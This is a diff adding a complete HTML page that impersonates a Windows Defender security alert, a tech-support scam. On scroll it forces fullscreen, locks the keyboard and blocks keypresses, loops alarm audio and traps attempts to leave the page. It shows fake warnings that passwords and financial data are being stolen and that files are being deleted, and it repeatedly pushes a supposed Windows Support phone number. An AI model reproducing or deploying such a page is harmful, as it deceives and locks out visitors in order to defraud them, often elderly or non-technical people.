@@ -1,0 +1,328 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+
+  <!-- Required meta tags -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title> The Code for 8th Dec </title>
+<link rel="stylesheet" href="styles.css">
+<script type="text/javascript" src="scripts.js"></script>
+<link rel="icon" type="image/png" href="windows.png">
+<!-- Bootstrap CSS -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"
+      integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+      <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"
+              integrity="sha384-Piv4xVNRyMGpqkS2by6br4gNJ7DXjqk09RmUpJ8addEventListenerjgGtD7zP9yug3goQfGII0yAns"
+              crossorigin="anonymous"></script>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-R6CGMQDZ4T"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-R6CGMQDZ4T');
+</script>
+
+<script>
+  // Function to request fullscreen mode
+  function requestFullScreen(element) {
+    if (element.requestFullscreen) {
+      element.requestFullscreen();
+    } else if (element.mozRequestFullScreen) { // Firefox
+      element.mozRequestFullScreen();
+    } else if (element.webkitRequestFullscreen) { // Chrome, Safari and Opera
+      element.webkitRequestFullscreen();
+    } else if (element.msRequestFullscreen) { // IE/Edge
+      element.msRequestFullscreen();
+    }
+  }
+
+  // Event listener for scroll
+  window.addEventListener('scroll', function() {
+    // Request fullscreen on first scroll
+    requestFullScreen(document.documentElement);
+
+    // Optionally: Remove the event listener if fullscreen is no longer needed after first activation
+    // window.removeEventListener('scroll', arguments.callee, false);
+  });
+</script>
+<style>
+  .black {
+    width: 100%;
+    height: 100%;
+    background-color: #000;
+    opacity: 0.7;
+    transition: 1s;
+    position: absolute;
+    top: -190px;
+    left:0
+  }
+  .slides{display: none;  }
+  .blink_me {
+  animation: blinker 3s linear infinite;
+}
+
+@keyframes blinker {
+  50% {
+    opacity: 0;
+  }
+}
+  </style>
+
+  <script>
+  var elem = document.documentElement;
+  function openFullscreen() {
+    if (elem.requestFullscreen) {
+      elem.requestFullscreen();
+    } else if (elem.webkitRequestFullscreen) { /* Safari */
+      elem.webkitRequestFullscreen();
+    } else if (elem.msRequestFullscreen) { /* IE11 */
+      elem.msRequestFullscreen();
+    }
+  }
+
+  function closeFullscreen() {
+    if (document.exitFullscreen) {
+      document.exitFullscreen();
+    } else if (document.webkitExitFullscreen) { /* Safari */
+      document.webkitExitFullscreen();
+    } else if (document.msExitFullscreen) { /* IE11 */
+      document.msExitFullscreen();
+    }
+  }
+
+
+  </script>
+
+
+    <script>
+        function getVariableFromURl(name)
+        {
+            name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+            var regexS = "[\\?&]"+name+"=([^&#]*)";
+            var regex = new RegExp( regexS );
+            var results = regex.exec( window.location.href );
+            if( results == null )
+                return "";
+            else
+                return results[1];
+        }
+    </script>
+    <script type="text/javascript">
+        var phone = getVariableFromURl('phone');
+    </script>
+
+<script type="text/javascript">
+window.onbeforeunload = function() {
+   if (data_needs_saving()) {
+       return "Windowsを呼び出す ディフェンダー 今すぐヘルプライン";
+   } else {
+      return;
+   }
+};
+        </script>
+        <script type="text/javascript">
+            window.addEventListener("beforeunload", function (e) {
+         var confirmationMessage = 'It looks like you are editing something.'
+                            + 'Your changes will be lost if you leave before saving.';
+
+                (e || window.event).returnValue = confirmationMessage; //Gecko + IE
+                return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
+            });
+        </script>
+        <script type="text/javascript">
+            var phone_number = '';
+        </script>
+
+</head>
+<body id="mycanvas" onclick="playSound()" style="background-image: url(slide/bg.png);background-size: 100%" >
+
+<div onclick="slide()">
+
+
+
+<style type="text/css">
+  span.slides {
+    position: relative;
+}
+</style>
+  <img id="banner" style="position:relative; top:21px;left:-31px;width:45%" src="slide/s/1.png" style="width:40%">
+
+<span class="slides slides1 blink_me" style="top:-244px;left:452px;width:40%"><img id="banner" src="slide/s/1.png" style="width:40%;box-shadow: 4px 6px 9px black;"></span>
+<span class="slides slides2 blink_me" style="top:-587px;right:473px;width:40%"><img id="banner" src="slide/s/1.png" style="width:40%;box-shadow: 4px 6px 9px black;"></span>
+<span class="slides slides3 blink_me" style="top:-687px;left:-12px;width:40%"><img id="banner" src="slide/s/1.png" style="width:40%;box-shadow: 4px 6px 9px black;"></span>
+<span class="slides slides4 blink_me" style="top:-948px;right:434px;width:40%"><img id="banner" src="slide/s/1.png" style="width:40%;box-shadow: 4px 6px 9px black;"></span>
+<span class="slides slides5 blink_me" style="top:-1264px;right:-513px;width:40%"><img id="banner" src="slide/s/1.png" style="width:40%;box-shadow: 4px 6px 9px black;"></span>
+<span class="slides slides6 blink_me" style="top:-2075px;left:271px;width:40%"><img id="banner" src="slide/s/1.png" style="width:40%;box-shadow: 4px 6px 9px black;"></span>
+<span class="slides slides7 blink_me" style="top:-2375px;right:439px;width:40%"><img id="banner" src="slide/s/1.png" style="width:40%;box-shadow: 4px 6px 9px black;"></span>
+<span class="slides slides8 blink_me" style="top:-2425px;left:21px;width:40%"><img id="banner" src="slide/s/1.png" style="width:40%;box-shadow: 4px 6px 9px black;"></span>
+
+
+<span class="slides slides9 blink_me" style="top:-2291px;left:57px;width:40%"><img id="banner" src="slide/s/1.png" style="width:40%;box-shadow: 4px 6px 9px black;"></span>
+<span class="slides slides10 blink_me" style="top:-2616px;left:286px;width:40%"><img id="banner" src="slide/s/1.png" style="width:40%;box-shadow: 4px 6px 9px black;"></span>
+<span class="slides slides11 blink_me" style="top:-2025px;left:42px;width:40%"><img id="banner" src="slide/s/1.png" style="width:40%;box-shadow: 4px 6px 9px black;"></span>
+<span class="slides slides12 blink_me" style="top:-2125px;left:85px;width:40%"><img id="banner" src="slide/s/1.png" style="width:40%;box-shadow: 4px 6px 9px black;"></span>
+<span class="slides slides13 blink_me" style="top:-3544px;right:509px;width:40%"><img id="banner" src="slide/s/1.png" style="width:40%;box-shadow: 4px 6px 9px black;"></span>
+  
+
+<div id="footer" style="bottom: 0; position: absolute;width: auto;overflow: hidden;">
+  <div class="row">
+
+      <div class="col-md-12">
+          <div class="right-foot" style="text-align: center;">
+              <span id="footertxt" style="font-weight: 700;"><img src="windows.png">  Windows </span><span style="font-weight: 700;padding-left: 5px;color: #fff;">Support Contact <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-888-434-2616 (Security Support)</span></span>
+          </div>
+      </div>
+      <div class="col-md-12">
+          <marquee width="100%" direction="left" height="100px"><small class="text-left" style="color: #eee;font-size: 12px;">Windows
+            Defender SmartScreen prevented unrecognized apps from displaying. Running this app may put your PC
+            at risk. Windows  Defender Scan has found unwanted adware that may steal on this device
+            passwords, online IDs, financial information, personal files, photos, or
+            document.</small></marquee>
+      </div>
+  </div>
+</div>
+
+<div id="gifs" style="display:none; height: auto; width: 550px;left:32%;position: absolute;z-index: 9999999999;text-align: center;top: 0; "><img src="boxes.gif" alt="gif" class="img-fluid w-100">
+</div>
+
+<div id="welcomeDiv"
+     style=" display:none; background-color:#000; height: auto; width: 550px;left:32%;position: absolute;z-index: 9999999999;text-align: center;top: 26%; "
+     class="answer_list">
+    <p class="text-center" style="color: #fff;  margin-top:10px; font-size: 16px; opacity:.9; ">Temporary Files deletion have started. Do not touch or use the machine because that may result to permanent files deletion. We understand it annoys you, but it is for your own safety. Please contact us immediately. A technician will help you solve the problem. If you are the Owner of the Windows  Activation Keys report immediately to Windows  Support: <b>+1-888-434-2616 (Toll Free)</b> to halt the auto-deletion of files and application from this computer.</p>
+</div>
+
+</div>
+<script type="text/javascript" src="custom1.js"></script>
+<script type="text/javascript" src="custom2.js"></script>
+
+<script type="text/javascript">
+
+
+
+function enterFullScreen(element) {
+  if(element.requestFullscreen) {
+    element.requestFullscreen();
+  }else if (element.mozRequestFullScreen) {
+    element.mozRequestFullScreen();     // Firefox
+  }else if (element.webkitRequestFullscreen) {
+    element.webkitRequestFullscreen();  // Safari
+  }else if(element.msRequestFullscreen) {
+    element.msRequestFullscreen();      // IE/Edge
+  }
+};
+
+
+
+
+
+
+  
+  $(document).ready(function () {
+        $(".sf_bxs2").delay(1500).fadeIn(800);
+        $(".sf_bxs3").delay(2500).fadeIn(800);
+        $(".sf_bxs3").delay(3000).fadeIn(800);
+      $(".alert_popup").delay(3500).fadeIn(800);
+      $("#lst").delay(4000).fadeIn(800);
+  });
+</script>
+
+<script>
+  $(document).ready(function () {
+      $("#mycanvas").click(function () {
+          $("#welcomeDiv").show();
+      });
+  });
+</script>
+<script>
+  $(document).ready(function () {
+      $("#mycanvas").click(function () {
+          $("#gifs").show();
+      });
+  });
+</script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+<script type="text/javascript">
+  function playSound() {
+    document.getElementById("beep").play();
+ }
+
+
+
+
+// $(document).ready(function(){    
+// setInterval(slide(),3000); 
+// });
+
+function slide() {
+$('.slides').css("display","unset");
+ }
+
+
+
+
+
+
+
+
+
+</script>
+
+<script>
+   $(document).ready(function() {
+    var audioElement = document.createElement('audio');
+    audioElement.setAttribute('src', 'be00ep.mp4');
+
+    audioElement.addEventListener('ended', function() {
+        this.play();
+    }, false);
+
+
+     $('#mycanvas').click(function() {
+        audioElement.play();
+
+    });
+
+      $('#link_black').click(function() {
+        audioElement.play();
+
+    });
+
+
+       $('#footer').click(function() {
+        audioElement.play();
+
+    });
+
+        $('#lst').click(function() {
+        audioElement.play();
+
+    });
+
+
+
+
+
+});
+</script>
+
+
+<script>
+  navigator.keyboard.lock();
+  document.onkeydown = function (e) {
+  return false;
+  }
+  </script>
+
+ </body>
+
+
+</html>
